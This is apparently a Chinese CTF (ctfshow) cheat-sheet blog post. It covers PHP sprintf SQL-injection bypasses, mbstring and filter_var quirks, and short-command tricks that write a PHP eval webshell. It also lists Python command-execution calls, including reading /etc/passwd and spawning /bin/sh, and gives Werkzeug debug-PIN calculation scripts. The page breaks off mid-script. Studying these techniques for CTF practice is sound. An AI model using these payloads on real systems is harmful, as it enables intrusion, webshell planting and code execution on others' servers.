<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>常用姿势 | wanyanblog</title><meta name="author" content="wan yan"><meta name="copyright" content="wan yan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="php  1.sprintf函数: 12作用是将格式化字符串写入变量中函数形式为sprintf(format,arg1,arg2,arg++) 123456789不带占位符:&lt;?php$sql&#x3D;&quot;select * from user where username&#x3D;&#x27;%\&#x27; and 1&#x3D;1 #&#x27;;&quot;;  $user&#x3D;&#x27;admin&amp;#"><meta property="og:type" content="article"><meta property="og:title" content="常用姿势"><meta property="og:url" content="https://blog.wanyanai.top/2025/10/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/index.html"><meta property="og:site_name" content="wanyanblog"><meta property="og:description" content="php  1.sprintf函数: 12作用是将格式化字符串写入变量中函数形式为sprintf(format,arg1,arg2,arg++) 123456789不带占位符:&lt;?php$sql&#x3D;&quot;select * from user where username&#x3D;&#x27;%\&#x27; and 1&#x3D;1 #&#x27;;&quot;;  $user&#x3D;&#x27;admin&amp;#"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://blog.wanyanai.top/img/wanyan.jpg"><meta property="article:published_time" content="2025-10-25T13:40:14.000Z"><meta property="article:modified_time" content="2025-10-25T13:40:14.377Z"><meta property="article:author" content="wan yan"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://blog.wanyanai.top/img/wanyan.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "常用姿势",
  "url": "https://blog.wanyanai.top/2025/10/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/",
  "image": "https://blog.wanyanai.top/img/wanyan.jpg",
  "datePublished": "2025-10-25T13:40:14.000Z",
  "dateModified": "2025-10-25T13:40:14.377Z",
  "author": [
    {
      "@type": "Person",
      "name": "wan yan",
      "url": "https://blog.wanyanai.top/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/wanyan.jpg"><link rel="canonical" href="https://blog.wanyanai.top/2025/10/25/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>(() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()</script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"常用姿势",isHighlightShrink:!1,isToc:!0,pageType:"post"}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image:url(/img/background.jpg)"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/wanyan.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span>归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(/img/background.jpg)"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">wanyanblog</span></a><a class="nav-page-title" href="/"><span class="site-name">常用姿势</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><span>分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><span>标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><span>归档</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">常用姿势</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-10-25T13:40:14.000Z" title="Created 2025-10-25 21:40:14">2025-10-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-25T13:40:14.377Z" title="Updated 2025-10-25 21:40:14">2025-10-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="php"><a class="markdownIt-Anchor" href="#php"></a> php</h1><h2 id="1sprintf函数"><a class="markdownIt-Anchor" href="#1sprintf函数"></a> 1.sprintf函数:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不带占位符:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">有占位符:  %<span class="number">1</span>$\  是一样的道理%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure><hr><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> 当传入pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    得到 and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      之后第三步 select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   但是%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure><h2 id="2mb_strpos和mb_substr函数php739"><a class="markdownIt-Anchor" href="#2mb_strpos和mb_substr函数php739"></a> 2.mb_strpos和mb_substr函数(php7.3.9):</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当以 \xF0 开头的字节序列出现在 UTF-<span class="number">8</span> 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-<span class="number">8</span> 编码规范定义了以 \xF0 开头的字节序列用于编码较大的 Unicode 字符。</span><br><span class="line">    <span class="title function_ invoke__">mb_strpos</span>() 和 <span class="title function_ invoke__">mb_substr</span>() 在面对 非法编码的字符或多字节截断字符 时，行为不一致，可能引发绕过漏洞。</span><br></pre></td></tr></table></figure><h3 id="21mb_strpos函数"><a class="markdownIt-Anchor" href="#21mb_strpos函数"></a> 2.1mb_strpos函数:</h3><p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="string">&quot;\xF0\x9EAAA&lt;BB&quot;</span>, <span class="string">&#x27;&lt;&#x27;</span>)     --返回<span class="number">4</span></span><br><span class="line">                                在不满足<span class="number">4</span>字节时: 会把\xF0\x9E当作一个字节</span><br></pre></td></tr></table></figure><h3 id="22mb_substr函数"><a class="markdownIt-Anchor" href="#22mb_substr函数"></a> 2.2mb_substr函数:</h3><p>mb_substr — 获取部分字符串(按字符来取:utf-8四字节)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;\xf0\x9eAAA&lt;BB&quot;</span>, <span class="number">0</span>, <span class="number">4</span>)     ---从第<span class="number">0</span>字节开始截取，到第<span class="number">4</span>位字节</span><br><span class="line">                                 在不满足<span class="number">4</span>字节时: 会把\xF0\x9EAA当作一个字符</span><br></pre></td></tr></table></figure><h3 id="结论"><a class="markdownIt-Anchor" href="#结论"></a> 结论:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节</span><br><span class="line">一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节</span><br><span class="line">一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</span><br></pre></td></tr></table></figure><h2 id="3filter_validate_ip函数"><a class="markdownIt-Anchor" href="#3filter_validate_ip函数"></a> 3.FILTER_VALIDATE_IP函数:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对这个函数来说:<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP)</span><br><span class="line">    <span class="variable">$ip</span>=cdef::<span class="variable constant_">abce</span>      ---  会被解析成ipv6地址,但是只能为 a-f 表示<span class="number">16</span>进制，而且最多为<span class="number">4</span>位</span><br></pre></td></tr></table></figure><h2 id="4filter_validate_email函数"><a class="markdownIt-Anchor" href="#4filter_validate_email函数"></a> 4.FILTER_VALIDATE_EMAIL函数:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个函数要求所有的特殊字符都需要被<span class="string">&quot;&quot;</span>包括</span><br></pre></td></tr></table></figure><h2 id="5命令注入长度限制绕过"><a class="markdownIt-Anchor" href="#5命令注入长度限制绕过"></a> 5.命令注入长度限制绕过:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`  `   ---反引号执行命令;</span><br><span class="line">nl   ---查看文件</span><br></pre></td></tr></table></figure><h3 id="115位可控字符下的任意命令执行"><a class="markdownIt-Anchor" href="#115位可控字符下的任意命令执行"></a> 1.15位可控字符下的任意命令执行:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如需执行 <span class="keyword">echo</span> \<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);?\&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> \<span class="meta">&lt;?php</span> &gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>\(&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \<span class="variable">$_GET</span>&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \[<span class="number">1</span>\]&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \)\;<span class="meta">?&gt;</span>&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="27-5位可控字符下的任意命令执行"><a class="markdownIt-Anchor" href="#27-5位可控字符下的任意命令执行"></a> 2.7-5位可控字符下的任意命令执行:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls&gt;c会将目录下面的文件名写入到c文件中；ls -t&gt;<span class="number">0</span>会将文件名按照创建的时间倒叙写入<span class="number">0</span>文件中。并且自动换行。</span><br><span class="line">\作为转义符，转义之后的<span class="string">&#x27;\&#x27;是用来换行分隔，也就是换行也是连接的。</span></span><br><span class="line"><span class="string">执行这个命令:</span></span><br><span class="line"><span class="string">	echo PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4= | base64 -d &gt;1.php</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	w&gt;hp</span></span><br><span class="line"><span class="string">	w&gt;\.p\\     --第一个\转义.第二个\转义\</span></span><br><span class="line"><span class="string">倒叙新建文件名，然后通过ls -t&gt;0，将刚才的顺序再倒序然后写入到0文件中，然后用sh将0当作脚本执行。</span></span><br><span class="line"><span class="string">	可以把ls -t&gt;0继续分端存入文件      ---最低5位 &gt;\ \\这个就需要5位了</span></span><br></pre></td></tr></table></figure><h3 id="34位命令执行"><a class="markdownIt-Anchor" href="#34位命令执行"></a> 3.4位命令执行:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;sl</span><br><span class="line">&gt;l\-</span><br><span class="line">&gt;dir     现在*就是dir</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;<span class="number">0</span></span><br><span class="line">sh <span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="python"><a class="markdownIt-Anchor" href="#python"></a> python:</h1><h2 id="1执行函数"><a class="markdownIt-Anchor" href="#1执行函数"></a> 1.执行函数 :</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure><table><thead><tr><th>方法</th><th>示例代码（精简）</th><th>返回值 / 行为</th><th>优点 / 场景</th><th>风险 / 绕过点</th></tr></thead><tbody><tr><td><code>os.system</code></td><td><code>os.system(&quot;ls -la&quot;)</code></td><td>返回退出码，只把输出写到 stdout</td><td>简单、常见</td><td>无输出捕获，不适合读取结果</td></tr><tr><td><code>os.popen</code></td><td><code>os.popen(&quot;cat /etc/passwd&quot;).read()</code></td><td>返回字符串输出</td><td>易用于拿回显（CTF 常用）</td><td>受限环境可被禁用</td></tr><tr><td><code>subprocess.run</code></td><td><code>subprocess.run([&quot;ls&quot;,&quot;-la&quot;])</code></td><td><code>CompletedProcess</code>，可设置 <code>capture_output=True</code></td><td>推荐标准方式，参数化、安全</td><td><code>shell=True</code> 则有注入风险</td></tr><tr><td><code>subprocess.check_output</code></td><td><code>subprocess.check_output(&quot;whoami&quot;, shell=True)</code></td><td>返回 bytes（命令输出）</td><td>直接拿到输出</td><td><code>shell=True</code> 有注入风险</td></tr><tr><td><code>os.exec*</code> 系列</td><td><code>os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;)</code></td><td>替换当前进程，不回到 Python</td><td>做后门 / 逃逸进程时用</td><td>会终止原 Python 程序</td></tr><tr><td>动态导入（绕过限制）</td><td><code>__import__('os').popen('id').read()</code></td><td>同 <code>os.popen</code></td><td>当 <code>os</code> 被删除或屏蔽时可用</td><td>常见绕过手段</td></tr><tr><td><code>ctypes</code> / syscall</td><td><code>ctypes.CDLL(None).system(b&quot;ls&quot;)</code></td><td>调用 libc 的 system</td><td>当内置模块受限时尝试</td><td>复杂，平台相关</td></tr><tr><td>反弹/互动 shell (实验室)</td><td><code>python -c '...'</code></td><td>获取交互 shell / 反弹</td><td>用于拿交互式控制</td><td>高风险，仅限授权环境</td></tr></tbody></table><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;&#x27;</span>).read()    ---用这个能读文件</span><br></pre></td></tr></table></figure><h1 id="flask算pin"><a class="markdownIt-Anchor" href="#flask算pin"></a> flask算pin:</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式 ----报错即可进入</span><br></pre></td></tr></table></figure><h2 id="1pin码的生成"><a class="markdownIt-Anchor" href="#1pin码的生成"></a> 1.pin码的生成:</h2><ul><li>1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测</li><li>2.modname 默认flask.app</li><li>3.appname 默认Flask</li><li>4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量</li><li>5.uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算</li><li>6.machine_id 机器码,由三个合并(docker就后两个)：1./etc/machine-id(docker无) 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup(也可以把self换成pid)</li></ul><h2 id="2python36md5"><a class="markdownIt-Anchor" href="#2python36md5"></a> 2.python3.6(md5):</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>    <span class="comment"># moddir</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,    <span class="comment"># uuidnode mac地址</span></span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span>    <span class="comment">#machine_id 机器码</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><h2 id="3python38sha1"><a class="markdownIt-Anchor" href="#3python38sha1"></a> 3.python3.8(sha1):</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>    <span class="comment"># moddir</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span 